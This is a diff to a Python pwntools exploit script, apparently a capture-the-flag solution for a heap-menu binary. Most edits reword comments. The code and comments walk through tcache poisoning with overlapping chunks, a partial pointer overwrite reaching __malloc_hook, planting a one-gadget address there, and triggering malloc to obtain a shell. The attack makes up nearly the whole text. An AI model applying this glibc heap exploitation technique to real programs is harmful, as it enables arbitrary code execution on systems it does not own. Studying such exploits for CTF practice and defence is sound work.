@@ -78,6 +78,7 @@ def exploit():
 
     # having altered the `mchunk_size` field of C, chunk B1 is seen as not-in-use (even though it is); thus,
     # the last 8 bytes of B1 (which we control) are interpreted as the `mchunk_prev_size` field of C
+
     # here, we have set the `mchunk_prev_size` of C so that, instead of pointing to the start of
     # chunk B (as it should), it points to the start of chunk A
 
@@ -101,14 +102,14 @@ def exploit():
     delete_heap(2)
     # since M and X have the same address, the `next` pointer of X (coincident with the `fd` field of M)
     # is also overwritten with the address of the unsorted bin
-    # now `tcache->entries[1] = M (== X) -> UNSORTED_BIN_ADDR -> ???`
+    # now `tcache->entries[1] = X (== M) -> UNSORTED_BIN_ADDR -> ???`
 
     # if we allocate two chunks of size 0x20, these will be pulled from `tcache->entries[1]`,
     # and the second chunk will start exactly at `UNSORTED_BIN_ADDR`
 
     # our end goal is to write into `__malloc_hook` the address of a one-gadget
     # to do so, we need to:
-    # 1) make malloc returning the address of `__malloc_hook-0x10`, so to write 0x31 at `__malloc_hook-0x10`
+    # 1) make malloc returning the address of `__malloc_hook`-0x10, so to write 0x31 at `__malloc_hook`-0x10
     #    and create a fake chunk of size 0x20 starting at `__malloc_hook`
     # 2) make malloc returning the address of `__malloc_hook`, and save the pointer
     # 3) put at the top of the `tcache->entries[1]` bin the address of a one-gadget
@@ -119,11 +120,11 @@ def exploit():
     # we now continue the exploit proceeding with step 1)
 
     # we reallocate M as M1, specifying a size of 0x1000 but providing only 3 bytes of data
-    # (the 3 least significative bytes of the address of `__malloc_hook-0x10`)
+    # (the 3 least significative bytes of the address of `__malloc_hook`-0x10)
     M1 = p32(__malloc_hook_addr - 0x10 & 0xFFFFFF)[:-1]
     new_heap(M1, size=0x1000)
     # since, once again, M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
-    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now `__malloc_hook-0x10`)
+    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`-0x10)
 
     # as said a few lines above, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
     Z = fit(filler="Z", length=0x20)
@@ -135,7 +136,7 @@ def exploit():
     # to 0x31 (i.e. 0x20 (chunk data) + 0x10 (chunk headers) + 0x1 (PREV_INUSE bit))
 
     # since we artificially added an entry in `tcache->entries[1]` by modifying a `next` pointer
-    # from NULL to `__malloc_hook-0x10`, the two consecutive allocations of chunks Z and W (both of size 0x20)
+    # from NULL to `__malloc_hook`-0x10, the two consecutive allocations of chunks Z and W (both of size 0x20)
     # had the side effect of setting `tcache->counts[1]` to -1, invalidating the possibility
     # of using `tcache->entries[1]` anymore
 
@@ -219,7 +220,7 @@ def exploit():
     M1 = p32(__malloc_hook_addr & 0xFFFFFF)[:-1]
     new_heap(M1, size=0x1000)
     # since M1 overlaps with X, with this reallocation we changed the lowest 3 bytes of
-    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and now is `__malloc_hook`)
+    # the `next` pointer of X (which was `UNSORTED_BIN_ADDR` and is now the address of `__malloc_hook`)
 
     # as explained before, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
     Z = fit(filler="Z", length=0x20)
@@ -232,9 +233,9 @@ def exploit():
     # ...and then a second chunk of size 0x20 to pull our chosen address of libc...
     W = "\0"
     new_heap(W, size=0x20)
-    # ...in which we write just \0 (so not to trigger any involuntary calls to `__malloc_hook`)
+    # ...in which we write \0 (so not to trigger any involuntary calls to `__malloc_hook`)
 
-    # `$chunks` now contains a pointer to `__malloc_hook` TODO
+    # we now have a pointer to `__malloc_hook`
 
     # (free chunks we don't use anymore, since the binary allows to use
     # at maximum 10 "heaps" (as it calls them) at a time)
@@ -316,22 +317,22 @@ def exploit():
     # at maximum 10 "heaps" (as it calls them) at a time)
     delete_heap(8)
 
-    # as explained before, we malloc a chunk of size 0x20 to first pull X from `tcache->entries[1]`...
+    # as explained before, we malloc a chunk of size 0x20 to pull X from `tcache->entries[1]`...
     Z = fit(filler="Z", length=0x20)
     new_heap(Z)
-    # now, at `tcache->entries[1]` we find the address of the one-gadget
+    # ...and now `tcache->entries[1] = ONE_GADGET_ADDR -> ???`
 
     # ######################################################################## #
 
     # we free the `__mallok_hook` chunk, completing step 4)
     delete_heap(0)
-    # now, `__malloc_hook` was overwritten with the address of the one-gadget
+    # now the address of the one-gadget is written at the address of `__malloc_hook`
 
     # in step 5), we malloc any chunk to trigger `__malloc_hook()`...
     io.sendlineafter("Your choice: ", "1")
     io.sendlineafter("Size:", "123")
 
-    # ...and pop a shell!
+    # ...and the shell pops!
 
 
 def new_heap(data, size=None):
